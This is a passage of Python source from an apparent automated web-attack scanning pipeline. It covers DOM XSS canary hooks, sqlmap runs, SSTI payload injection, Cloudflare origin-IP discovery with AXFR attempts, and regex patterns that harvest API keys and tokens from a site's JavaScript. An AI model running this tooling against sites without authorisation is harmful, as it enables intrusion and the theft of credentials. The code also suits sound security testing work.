        return {"11a-DOMXSS": str(_out), "count": 0}
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_domxss]
    if not param_urls:
        log("warn", "11a-DOMXSS: no parameter-bearing URLs; skipping")
        return {"11a-DOMXSS": str(_out), "count": 0}
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log("warn", "11a-DOMXSS: playwright not installed; skipping (pip install playwright)")
        return {"11a-DOMXSS": str(_out), "count": 0}
    _CANARY = "rcxss" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
    try:
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True, args=["--headless=new", "--no-sandbox", "--disable-gpu"])
            try:
                for url in param_urls:
                    await _throttle_rate()
                    context = await browser.new_context(
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    )
                    page = await context.new_page()
                    try:
                        await page.goto(url, timeout=15000, wait_until="domcontentloaded")
                        await page.evaluate(f"""() => {{
                            window.__rc_canary = "{_CANARY}";
                            window.__rc_hits = [];
                            const _eval = window.eval;
                            window.eval = function(s) {{ if(typeof s==='string'&&s.includes(window.__rc_canary)) window.__rc_hits.push('eval'); return _eval.call(window,s); }};
                            const _st = window.setTimeout;
                            window.setTimeout = function(f,d) {{ if(typeof f==='string'&&f.includes(window.__rc_canary)) window.__rc_hits.push('setTimeout(string)'); return _st.call(window,f,d); }};
                            const _fn = window.Function;
                            window.Function = function() {{ const s = Array.from(arguments).join(','); if(s.includes(window.__rc_canary)) window.__rc_hits.push('Function()'); return _fn.apply(this, arguments); }};
                        }}""")
                        await page.evaluate(f"location.hash='#/{_CANARY}'")
                        await asyncio.sleep(1)
                        sink_report = await page.evaluate("""() => {
                            const c = window.__rc_canary;
                            const r = [];
                            if (document.body && document.body.innerHTML.includes(c)) r.push('innerHTML');
                            if (document.documentElement && document.documentElement.outerHTML.includes(c)) r.push('outerHTML');
                            r.push(...(window.__rc_hits || []));
                            return r;
                        }""")
                        for s in sink_report:
                            findings.append(f"[domxss-sink] {url} — sink={s} source=location.hash")
                        await page.goto(url.split("#")[0] + "#" + _CANARY, timeout=15000, wait_until="domcontentloaded")
                        await asyncio.sleep(1)
                        frag_report = await page.evaluate("""() => {
                            const c = window.__rc_canary;
                            const r = [];
                            if (document.body && document.body.innerHTML.includes(c)) r.push('innerHTML');
                            r.push(...(window.__rc_hits || []));
                            return r;
                        }""")
                        for s in frag_report:
                            findings.append(f"[domxss-sink] {url} — sink={s} source=url-fragment")
                        await page.evaluate(f"window.postMessage({{__rc:\"{_CANARY}\"}}, '*')")
                        await asyncio.sleep(1)
                        pm_report = await page.evaluate("""() => {
                            const c = window.__rc_canary;
                            const r = [];
                            if (document.body && document.body.innerHTML.includes(c)) r.push('innerHTML');
                            r.push(...(window.__rc_hits || []));
                            return r;
                        }""")
                        for s in pm_report:
                            findings.append(f"[domxss-sink] {url} — sink={s} source=postMessage")
                    except Exception:
                        continue
                    finally:
                        await context.close()
            finally:
                try:
                    await browser.close()
                except Exception:
                    pass
    except Exception as e:
        log("warn", f"11a-DOMXSS: browser crashed ({e}); saving {len(findings)} partial findings")
    if not findings:
        findings.append("[domxss] No DOM-based XSS candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"11a-DOMXSS: {len(findings)} DOM XSS findings → {out}")
    return {"11a-DOMXSS": str(_out), "count": len(findings)}


async def phase_11b_SQLMAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11b-SQLMAP"}:
        return {}
    _out = outdir / "sqlmap_findings.txt"
    if _out.exists() and not force:
        return {"11b-SQLMAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 11b-SQLMAP: sqlmap with enriched parameter set")
    findings: List[str] = []
    # Collect param-bearing URLs from harvested URLs and Arjun-discovered params
    all_urls: List[str] = []
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        all_urls.extend(read_lines(urls_file))
    params_file = prev.get("07-PARAMS", "")
    if params_file and Path(params_file).exists():
        all_urls.extend(read_lines(Path(params_file)))
    deduped = list(dict.fromkeys(all_urls))
    param_urls = [u for u in deduped if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_fuzz]
    if not param_urls:
        log("warn", "11b-SQLMAP: no parameter-bearing URLs available; skipping")
        return {"11b-SQLMAP": str(_out), "count": 0}
    candidates = list(param_urls)
    for url in candidates:
        findings.append(f"[candidate] {url}")
    _sql_extra_headers = _extra_headers_dict()
    # Now run sqlmap on the filtered candidates
    if t.has("sqlmap"):
        sqlmap_in = ensure(outdir / "sqlmap_candidates.txt")
        sqlmap_in.write_text("\n".join(sorted(set(candidates))) + "\n")
        sqlmap_dir = outdir / "sqlmap_11b_output"
        runner = outdir / "logs" / "sqlmap_11b_runner.sh"
        _sql_extra = ""
        if _PIPELINE_CFG.proxy:
            _sql_extra += f" --proxy={shlex.quote(_PIPELINE_CFG.proxy)}"
        _sql_headers = "; ".join(f"{k}: {v}" for k, v in _sql_extra_headers.items())
        if _sql_headers:
            _sql_extra += " --headers=" + shlex.quote(_sql_headers)
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(sqlmap_in))}\n"
            f"DIR={shlex.quote(str(sqlmap_dir))}\n"
            'mkdir -p "$DIR"\n'
            f'sqlmap -m "$IN" --batch --level={_PIPELINE_CFG.sqlmap_level} --risk={_PIPELINE_CFG.sqlmap_risk} --random-agent '
            f'--delay={max(_PIPELINE_CFG.delay, 0)} --time-sec=0 '
            f'{_sql_extra}'
             f' --output-dir="$DIR" > "{shlex.quote(str(outdir / "sqlmap_11b.log"))}" 2>&1\n'
        )
        runner.chmod(0o700)
        await _run("sqlmap-11b", ["bash", str(runner)], 7200, outdir)
        sqlmap_log = outdir / "sqlmap_11b.log"
        if sqlmap_log.exists():
            for ln in read_lines(sqlmap_log):
                lower = ln.lower()
                if any(kw in lower for kw in ("sql injection", "parameter", "payload:", "type: ", "title:")):
                    findings.append(ln)
    else:
        findings.append("[info] sqlmap not installed; skipping automated SQL injection testing")
    if not findings:
        findings.append("[result] No SQL injection vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"11b-SQLMAP: {len(findings)} findings → {out}")
    return {"11b-SQLMAP": str(_out), "count": len(findings)}


async def phase_12_SSTI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"12-SSTI"}:
        return {}
    _g2_out = outdir / "ssti.txt"
    if _g2_out.exists() and not force:
        return {"12-SSTI": str(_g2_out), "count": count_nonblank(_g2_out)}
    log("info", "Phase 12-SSTI: SSTI + deep XSS/SQLi fuzzing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "12-SSTI: no URLs; skipping")
        ensure(_g2_out).write_text("")
        return {"12-SSTI": str(_g2_out), "count": 0}
    all_urls = _dedupe_by_host_params(all_urls)
    all_urls = _dedupe_by_normalized_url(all_urls)
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    if not param_urls:
        log("warn", "12-SSTI: no param-bearing URLs; skipping")
        ensure(_g2_out).write_text("")
        return {"12-SSTI": str(_g2_out), "count": 0}

    eval_map = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "*{7*7}": "49",
        "{{7*'7'}}": "7777777",
        "<%= 7*7 %>": "49",
        "${{7*7}}": "49",
    }

    _SPA_INDICATORS = [
        "window.__nuxt__", "__nuxt", "data-server-rendered",
        "window.__vue__", "__vue_devtools_global_hook__",
        "__next_data__", "_next/static", "react", "reactdom",
        "ng-version", "ng-app", "ng_App", "angular",
    ]

    ssti_findings: List[str] = []
    seen_ssti: Set[str] = set()
    _ssti_extra_headers = _extra_headers_dict()
    _ssti_urlopen = _get_urlopener()
    baseline_counts: Dict[str, Dict[str, int]] = {}
    baseline_spa: Dict[str, bool] = {}

    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
        )

        if base_url not in baseline_counts:
            try:
                _req_hdr = {"User-Agent": "Mozilla/5.0"}
                _req_hdr.update(_ssti_extra_headers)
                req = urllib.request.Request(base_url, headers=_req_hdr)
                await _throttle_rate()
                _, _, body_bytes = await _async_urlopen(
                    _ssti_urlopen, req, timeout=15
                )
                base_body = body_bytes.decode("utf-8", errors="ignore")
                baseline_counts[base_url] = {
                    exp: base_body.count(exp)
                    for exp in set(eval_map.values())
                }
                base_lower = base_body.lower()
                baseline_spa[base_url] = any(ind in base_lower for ind in _SPA_INDICATORS)
            except Exception:
                baseline_counts[base_url] = {}
                baseline_spa[base_url] = False

        base_expected_counts = baseline_counts[base_url]
        if not base_expected_counts:
            continue

        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload, expected in eval_map.items():
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                if test_url in seen_ssti:
                    continue
                seen_ssti.add(test_url)
                await _throttle_rate()
                try:
                    _ssti_req_hdr = {"User-Agent": "Mozilla/5.0"}
                    _ssti_req_hdr.update(_ssti_extra_headers)
                    req = urllib.request.Request(
                        test_url,
                        headers=_ssti_req_hdr,
                    )
                    _, _, body_bytes = await _async_urlopen(_ssti_urlopen, req, timeout=15)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    ssti_count = body.count(expected)
                    is_spa = baseline_spa[base_url]
                    payload_in_body = payload in body

                    if ssti_count > base_expected_counts.get(expected, 0):
                        if is_spa and payload_in_body:
                            ssti_findings.append(
                                f"[SSTI-client-evaluated] {test_url} param={param_name} payload={payload} → {expected} "
                                f"(baseline {base_expected_counts.get(expected, 0)} → {ssti_count}) [SPA page, raw payload present]"
                            )
                        else:
                            ssti_findings.append(
                                f"[SSTI-evaluated] {test_url} param={param_name} payload={payload} → {expected} "
                                f"(baseline {base_expected_counts.get(expected, 0)} → {ssti_count})"
                            )
                    elif payload_in_body:
                        ssti_findings.append(
                            f"[SSTI-reflected-only] {test_url} param={param_name} payload={payload}"
                        )
                except Exception:
                    continue

    ensure(outdir / "ssti.txt").write_text(
        "\n".join(ssti_findings) + ("\n" if ssti_findings else "")
    )
    log("ok", f"12-SSTI: {len(ssti_findings)} SSTI reflections detected")
    return {"12-SSTI": str(outdir / "ssti.txt"), "count": len(ssti_findings)}


async def phase_13_OOB(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast: Interactsh, force: bool = False) -> Dict[str, Any]:
    if skip & {"13-OOB"}:
        return {}
    _h_out = outdir / "oast" / "callbacks.txt"
    if _h_out.exists() and not force:
        return {"13-OOB": str(_h_out), "count": count_nonblank(_h_out)}
    log("info", "Phase 13-OOB: OAST callback collection")
    out = oast.stop()
    n = count_nonblank(out)
    if n:
        log("ok", f"13-OOB: {n} OOB callback(s) captured")
    else:
        log("info", "13-OOB: no OOB callbacks captured")
    return {"13-OOB": str(out), "count": n}


# ─────────────────────────── manual-testing phases ──────────────────────────
# Phases 14-ORIGIN–L address gaps that automated scanners often miss but can be
# partially automated with targeted scripts and API calls.
# ───────────────────── Phase 14-ORIGIN: origin IP bypass ────────────────────────────
async def phase_14_ORIGIN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"14-ORIGIN"}:
        return {}
    _j_out = outdir / "origin.txt"
    if _j_out.exists() and not force:
        return {"14-ORIGIN": str(_j_out), "count": count_nonblank(_j_out)}
    log("info", "Phase 14-ORIGIN: origin IP bypass enumeration")
    findings: List[str] = []
    _j_extra_headers = _extra_headers_dict()
    _j_urlopen = _get_urlopener()
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists():
        hosts_file = outdir / "resolved.txt"
    have_hosts = hosts_file.exists() and bool(read_lines(hosts_file))
    # 1. Favicon hash
    favicon_urls = []
    if have_hosts:
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_origin]:
            base = h if h.startswith("http") else f"https://{h}"
            favicon_urls.append(base.rstrip("/") + "/favicon.ico")
    if not favicon_urls:
        favicon_urls = [f"https://{domain}/favicon.ico"]
    for url in favicon_urls:
        try:
            _j_fav_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_fav_hdr.update(_j_extra_headers)
            req = urllib.request.Request(url, headers=_j_fav_hdr, method="GET")
            _, _, data = await _async_urlopen(_j_urlopen, req, timeout=10)
            if data:
                h = _mmh3_hash(data) & 0xFFFFFFFF
                findings.append(f"favicon_hash={h} (url={url})")
                findings.append(
                    f"  Shodan: https://www.shodan.io/search?query=http.favicon.hash:{h}"
                )
                findings.append(
                    f"  Shodan (org): https://www.shodan.io/search?query=org:%22Cloudflare%22+http.favicon.hash:{h}"
                )
                break
        except Exception:
            continue
    # 2. crt.sh certificate history
    crt_urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://crt.sh/?q=%25.{domain}&output=json",
    ]
    crt_found_any = False
    for crt_url in crt_urls:
        if crt_found_any:
            break
        try:
            _j_crt_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_crt_hdr.update(_j_extra_headers)
            req = urllib.request.Request(crt_url, headers=_j_crt_hdr)
            _, _, crt_raw = await _async_urlopen(_j_urlopen, req, timeout=15)
            raw = crt_raw.decode("utf-8", errors="ignore")
            certs = json.loads(raw)
            if not isinstance(certs, list) or not certs:
                continue
            ips: Set[str] = set()
            subdomains: Set[str] = set()
            for c in certs if isinstance(certs, list) else []:
                if isinstance(c, dict):
                    nv = c.get("name_value", "")
                    for name in nv.split("\n"):
                        name = name.strip().lower()
                        if name and _is_valid_hostname(name):
                            subdomains.add(name)
            # Try to resolve a few subdomains to find non-CF IPs
            resolved = [s for s in subdomains if s != domain][:_PIPELINE_CFG.sample_hosts_origin]
            if t.has("dnsx") and resolved:
                crt_subs = outdir / "crt_subs.txt"
                ensure(crt_subs).write_text("\n".join(resolved) + "\n")
                crt_resolved = outdir / "crt_resolved.txt"
                await _run(
                    "dnsx-crt",
                    [
                        "dnsx",
                        "-silent",
                        "-l",
                        str(crt_subs),
                        "-o",
                        str(crt_resolved),
                        "-a",
                        "-resp",
                    ],
                    300,
                    outdir,
                )
                if crt_resolved.exists():
                    for ln in read_lines(crt_resolved):
                        parts = ln.split()
                        if len(parts) >= 3:
                            ip = parts[-1].strip("[]")
                            if ip and ip.count(".") == 3:
                                ips.add(ip)
            if ips:
                findings.append(f"crt.sh: {len(subdomains)} subdomains, {len(ips)} unique IPs")
                for ip in list(ips)[:10]:
                    findings.append(f"  origin_candidate={ip}")
            crt_found_any = True
        except Exception:
            continue
    # 3. MX records (often not proxied by Cloudflare)
    # Use public DNS resolver to avoid local stub resolver issues over proxychains
    mx_file = outdir / "mx_records.txt"
    _DNS_RESOLVER = "@8.8.8.8"
    _raw_dns_resolver = os.environ.get("DNS_RESOLVER", "")
    if _raw_dns_resolver and re.match(r'^@[A-Za-z0-9.\-:\[\]]+$', _raw_dns_resolver):
        _DNS_RESOLVER = _raw_dns_resolver
    if t.has("dig"):
        rc, mx_stdout, _ = await _run_cmd_clear_proxy(
            ["dig", "+short", _DNS_RESOLVER, "mx", domain], timeout=15,
        )
        mx = mx_stdout.decode("utf-8", errors="ignore").strip() if rc == 0 else ""
        if mx and not mx.startswith(";"):
            ensure(mx_file).write_text(mx + "\n")
            for ln in mx.splitlines():
                ln = ln.strip()
                if ln:
                    findings.append(f"mx_record={ln}")
                    # Try resolving the MX target
                    mx_host = (ln.split()[-1] if len(ln.split()) > 1 else ln).rstrip(".")
                    if t.has("dig"):
                        try:
                            rc2, out2, _ = await _run_cmd_clear_proxy(
                                ["dig", "+short", _DNS_RESOLVER, mx_host.rstrip(".")], timeout=10,
                            )
                            for mip in (out2.decode().splitlines() if rc2 == 0 else []):
                                mip = mip.strip()
                                if mip and mip.count(".") == 3:
                                    findings.append(f"  mx_ip={mip} (non-CF origin candidate)")
                        except Exception:
                            pass
    # 3b. DNS zone transfer attempt (AXFR) — low success rate but high impact
    if t.has("dig"):
        try:
            rc_ns, ns_stdout, _ = await _run_cmd_clear_proxy(
                ["dig", "+short", _DNS_RESOLVER, "ns", domain], timeout=10,
            )
            for ns_line in (ns_stdout.decode(errors="ignore").splitlines() if rc_ns == 0 else []):
                ns = ns_line.strip().rstrip(".")
                if not ns or not _is_valid_hostname(ns):
                    continue
                try:
                    rc_axfr, axfr_out, _ = await _run_cmd_clear_proxy(
                        ["dig", "axfr", f"@{ns}", domain], timeout=15,
                    )
                    axfr_text = axfr_out.decode(errors="ignore") if rc_axfr >= 0 else ""
                    # dig axfr returns exit code 0 even on failure; check for
                    # actual zone data (SOA record) vs "Transfer failed"
                    _axfr_has_data = (
                        "SOA" in axfr_text
                        and "Transfer failed" not in axfr_text
                    )
                    if _axfr_has_data:
                        findings.append(f"  axfr_success=YES (ns={ns}) — zone data follows")
                        for axfr_ln in axfr_text.splitlines()[:20]:
                            findings.append(f"    {axfr_ln[:120]}")
                except Exception:
                    continue
        except Exception:
            pass
    # 3c. SPF / DMARC / DKIM DNS record checks (all use TXT records)
    if t.has("dig"):
        for rec, label in (("txt", "SPF"), ("txt", "DMARC"), ("txt", "DKIM")):
            query = f"_dmarc.{domain}" if label == "DMARC" else (
                f"default._domainkey.{domain}" if label == "DKIM" else domain)
            try:
                rc_sp, sp_out, _ = await _run_cmd_clear_proxy(
                    ["dig", "+short", _DNS_RESOLVER, "txt", query], timeout=10,
                )
                sp_text = sp_out.decode(errors="ignore") if rc_sp >= 0 else ""
                if sp_text.strip():
                    findings.append(f"  {label}_records:")
                    for sp_ln in sp_text.splitlines()[:5]:
                        findings.append(f"    {sp_ln[:200]}")
                    if "v=spf1" in sp_text.lower() and "~all" in sp_text.lower():
                        findings.append(f"    → {label}: softfail (~all) — may be spoofable")
                    elif "v=spf1" in sp_text.lower() and "?all" in sp_text.lower():
                        findings.append(f"    → {label}: neutral (?all) — no enforcement")
                    elif "v=spf1" in sp_text.lower() and "-all" not in sp_text.lower():
                        findings.append(f"    → {label}: no hardfail — consider -all")
            except Exception:
                continue
    # 4. Check resolved IPs against Cloudflare ASN (with local caching)
    resolved_path = Path(prev.get("02-RESOLVE") or outdir / "resolved_full.txt")
    ipcache = outdir / ".ipinfo_cache.json"
    ipcache_data: Dict[str, dict] = {}
    if ipcache.exists():
        try:
            ipcache_data = json.loads(ipcache.read_text(encoding="utf-8", errors="ignore"))
        except (json.JSONDecodeError, ValueError):
            ipcache_data = {}
    if resolved_path.exists():
        resolved_ips: Set[str] = set()
        for ln in read_lines(resolved_path):
            parts = ln.split()
            if len(parts) >= 3 and parts[-2].strip("[]") == "A":
                # Only A-record lines: host [A] [1.2.3.4]
                ip = parts[-1].strip("[]")
                if ip and ip.count(".") == 3:
                    resolved_ips.add(ip)
        if resolved_ips:
            cf_ips: Set[str] = set()
            non_cf_ips: Set[str] = set()
            for ip in sorted(resolved_ips)[:_PIPELINE_CFG.sample_hosts_origin]:
                if ip in ipcache_data:
                    info_data = ipcache_data[ip]
                else:
                    try:
                        _j_ip_hdr = {"User-Agent": "Mozilla/5.0"}
                        _j_ip_hdr.update(_j_extra_headers)
                        req = urllib.request.Request(
                            f"https://ipinfo.io/{ip}/json", headers=_j_ip_hdr
                        )
                        _, _, ip_info_bytes = await _async_urlopen(_j_urlopen, req, timeout=10)
                        info = ip_info_bytes.decode("utf-8", errors="ignore")
                        info_data = json.loads(info)
                        ipcache_data[ip] = info_data
                    except Exception:
                        findings.append(
                            f"  unresolved_ip={ip} (check manually)"
                        )
                        continue
                org = (info_data.get("org") or "").lower()
                if "cloudflare" in org or "13335" in org:
                    cf_ips.add(ip)
                else:
                    non_cf_ips.add(ip)
                    findings.append(
                        f"  non_cloudflare_ip={ip}  org={info_data.get('org', 'unknown')}"
                    )
            if ipcache_data:
                ipcache.write_text(json.dumps(ipcache_data, indent=2))
            if cf_ips:
                findings.append(f"  cloudflare_ips={', '.join(sorted(cf_ips))}")
            if non_cf_ips:
                findings.append(f"  non_cloudflare_candidates={', '.join(sorted(non_cf_ips))}")
    out = ensure(outdir / "origin.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"14-ORIGIN: {len(findings)} origin findings → {out}")
    return {"14-ORIGIN": str(out), "count": len(findings)}


# ──────────────────── Phase 15-SECRETS: deep JS secret scanning ──────────────────────
_JS_SECRET_PATTERNS: List[Tuple[str, str]] = [
    ("firebase", r"AIza[0-9A-Za-z\-_]{35}"),
    ("stripe-live", r"(?:sk|pk)_live_[0-9A-Za-z]{24,}"),
    ("stripe-test", r"(?:sk|pk)_test_[0-9A-Za-z]{24,}"),
    ("github-tok", r"gh[opsu]_[0-9A-Za-z]{36,}"),
    ("aws-key", r"AKIA[0-9A-Z]{16}"),
    ("aws-secret", r"(?i)aws(.{0,20})?(?:secret|key).{0,20}[\"'][0-9a-zA-Z\/+=]{40}[\"']"),
    ("google-oauth", r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com"),
    ("slack-tok", r"xox[baprs]-[0-9A-Za-z\-]{10,}"),
    ("jwt", r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}"),
    ("heroku", r"https://api\.heroku\.com"),
    ("graphql", r"(graphql|gql)\s*[=:]\s*[\"']https?://"),
    ("s3-bucket", r"(?:bucket|asset|media|uploads|backup|files|cdn|static)\.(?:s3\.amazonaws\.com|s3-[a-z0-9-]+\.amazonaws\.com)"),
    ("process-env", r"process\.env\.(?:SECRET|TOKEN|KEY|PASSWORD|API_KEY|ACCESS_KEY|SECRET_KEY)"),
    ("json-secret-key", r"""(?i)(?:api[_-]?key|secret|token|password|passwd)\s*[:=]\s*["'`][A-Za-z0-9_\-/=+]{16,}["'`]"""),
    (
        "internal-ip",
        r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})",
    ),
    (
        "internal-host",
        r"(?i)(?:internal|private|staging|dev|jenkins|gitlab|jira|confluence)\.(?:com|local|internal|corp)",
    ),
]
_SOURCE_MAP_RE = re.compile(r'(?://#\s*sourceMappingURL=|sourceMappingURL=)([^\s"\']+)', re.IGNORECASE)


async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"15-SECRETS"}:
        return {}
    _k_out = outdir / "js_secrets_deep.txt"
    if _k_out.exists() and not force:
        return {"15-SECRETS": str(_k_out), "count": count_nonblank(_k_out)}
    log("info", "Phase 15-SECRETS: deep JS secret scanning (custom regex + entropy + source maps)")
    _k_extra_headers = _extra_headers_dict()
    _k_urlopen = _get_urlopener()
    js_urls = outdir / "urls_js.txt"
    if not js_urls.exists() or not read_lines(js_urls):
        await asyncio.sleep(3)
    if not js_urls.exists() or not read_lines(js_urls):
        log("info", "15-SECRETS: no JS URLs; skipping")
        return {"15-SECRETS": str(outdir / "js_secrets_deep.txt"), "count": 0}
    findings: List[str] = []
    seen_secrets: Set[str] = set()
    seen_sourcemaps: Set[str] = set()
    # unfurl URL component extraction from JS URLs (extracts paths, keys, values)
    if t.has("unfurl"):
        unfurl_out = outdir / "unfurled_urls.txt"
        runner = outdir / "logs" / "unfurl_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(js_urls))}\n"
            f"OUT={shlex.quote(str(unfurl_out))}\n"
            'cat "$IN" | unfurl paths >> "$OUT" 2>/dev/null\n'
            'cat "$IN" | unfurl keys >> "$OUT" 2>/dev/null\n'
            'cat "$IN" | unfurl values >> "$OUT"\n'
        )
        runner.chmod(0o700)
        unfurl_jobs: List[Tuple[str, List[str], int]] = []
        unfurl_jobs.append(("unfurl", ["bash", str(runner)], 300))
        await run_parallel(unfurl_jobs, outdir)
        if unfurl_out.exists() and read_lines(unfurl_out):
            deduped = set(read_lines(unfurl_out))
            unfurl_out.write_text("\n".join(sorted(deduped)) + "\n")
            merge_unique(
                [outdir / "urls_all.txt", unfurl_out],
                outdir / "urls_all.txt",
            )
    for js_url in read_lines(js_urls):
        try:
            _k_hdr = {"User-Agent": "Mozilla/5.0"}
            _k_hdr.update(_k_extra_headers)
            req = urllib.request.Request(js_url, headers=_k_hdr)
            _, _, body_bytes = await _async_urlopen(_k_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue
        # Save raw JS file for gitleaks scanning
        js_raw = ensure(outdir / f"js_raw_{safe_suffix(js_url)}.js")
        js_raw.write_text(body)
        # Custom regex patterns
        for name, pattern in _JS_SECRET_PATTERNS:
            for m in re.finditer(pattern, body):
                val = m.group()
                if val not in seen_secrets:
                    seen_secrets.add(val)
                    findings.append(f"[{name}] {val}  ({js_url})")
        # Shannon-entropy scan for high-entropy strings (likely API keys /
        # secrets not caught by regex). Look for base64-ish strings of 32+ chars.
        for m in re.finditer(r"[\"']([A-Za-z0-9+/=]{40,})[\"']", body):
            val = m.group(1)
            if val in seen_secrets:
                continue
            # Shannon entropy > 4.5 suggests random-looking secret
            freq: Dict[str, int] = {}
            for c in val:
                freq[c] = freq.get(c, 0) + 1
            entropy = 0.0
            for f in freq.values():
                p = f / len(val)
                entropy -= p * math.log2(p)
            if entropy > 4.5:
                seen_secrets.add(val)
                findings.append(f"[high-entropy] {val[:60]}… (entropy={entropy:.2f})  ({js_url})")
    # Source maps
        for m in _SOURCE_MAP_RE.finditer(body):
            sm_url = m.group(1)
            if not sm_url.startswith("http"):
                base = js_url.rsplit("/", 1)[0]
                sm_url = base.rstrip("/") + "/" + sm_url.lstrip("/")
            sm_entry = f"[sourcemap] {sm_url}  ({js_url})"
            if sm_url in seen_sourcemaps:
                continue
            seen_sourcemaps.add(sm_url)
            findings.append(sm_entry)
            try:
                _k_sm_hdr = {"User-Agent": "Mozilla/5.0"}
                _k_sm_hdr.update(_k_extra_headers)
                sm_req = urllib.request.Request(sm_url, headers=_k_sm_hdr)
                _, _, sm_body_bytes = await _async_urlopen(_k_urlopen, sm_req, timeout=15)
                sm_body = sm_body_bytes.decode("utf-8", errors="ignore")
                sm_data = json.loads(sm_body)
                sources = sm_data.get("sources") or []
                for src in sources:
                    if isinstance(src, str):
                        for name2, pattern2 in _JS_SECRET_PATTERNS:
                            for m2 in re.finditer(pattern2, src):
                                val2 = m2.group()
                                if val2 not in seen_secrets:
                                    seen_secrets.add(val2)
                                    findings.append(f"  [sourcemap-{name2}] {val2}")
            except Exception:
                continue
    # gitleaks scan on downloaded JS files for secret patterns
    # trufflehog scan on downloaded JS files
    if t.has("trufflehog"):
        if list(outdir.glob("js_raw_*.js")):
            truffle_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                truffle_out = outdir / f"trufflehog_{safe_suffix(jf.name)}.txt"
                truffle_runner = outdir / "logs" / f"trufflehog_{safe_suffix(jf.name)}.sh"
                ensure(truffle_runner)
                truffle_runner.write_text(
                    "#!/usr/bin/env bash\n"
                    "set -eu\n"
                    f"IN={shlex.quote(str(jf))}\n"
                    f"OUT={shlex.quote(str(truffle_out))}\n"
                    'trufflehog filesystem "$IN" --no-verification --no-update > "$OUT"\n'
                )
                truffle_runner.chmod(0o700)
                truffle_jobs.append((
                    f"trufflehog-{safe_suffix(jf.name)[:16]}",
                    ["bash", str(truffle_runner)],
                    300,
                ))
            if truffle_jobs:
                await run_parallel(truffle_jobs, outdir)
                for tfp in sorted(outdir.glob("trufflehog_*.txt")):
                    if tfp.exists() and read_lines(tfp):
                        for ln in read_lines(tfp):
                            findings.append(f"  [trufflehog] {ln}")
    if t.has("gitleaks"):
        if list(outdir.glob("js_raw_*.js")):
            gitleaks_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                safe = safe_suffix(jf.name)
                gl_out = outdir / f"gitleaks_{safe}.json"
                gitleaks_jobs.append(
                    (
                        f"gitleaks-{safe[:16]}",
                        [
                            "gitleaks", "detect",
                            "--source", str(jf),
                            "--report-format", "json",
                            "--report-path", str(gl_out),
                            "--no-git",
                            "-v",
                        ],
                        300,
                    )
                )
            if gitleaks_jobs:
                await run_parallel(gitleaks_jobs, outdir)
                for glp in sorted(outdir.glob("gitleaks_*.json")):
                    try:
                        gl_data = json.loads(glp.read_text(encoding="utf-8", errors="ignore"))
                        if isinstance(gl_data, list):
                            for item in gl_data:
                                desc = item.get("description", "secret")
                                fname = item.get("file", "")
                                line = item.get("startLine", "")
                                match = item.get("match", "")[:80]
                                findings.append(
                                    f"  [gitleaks] {desc} in {fname}:{line} {match}"
                                )
                        elif isinstance(gl_data, dict) and gl_data.get("Findings"):
                            for item in gl_data["Findings"]:
                                findings.append(
                                    f"  [gitleaks] {item.get('Description','secret')} "
                                    f"in {item.get('File','')}:{item.get('StartLine','')} "
                                    f"{item.get('Match','')[:80]}"
                                )
                    except (json.JSONDecodeError, ValueError):
                        continue
    out = ensure(outdir / "js_secrets_deep.txt")
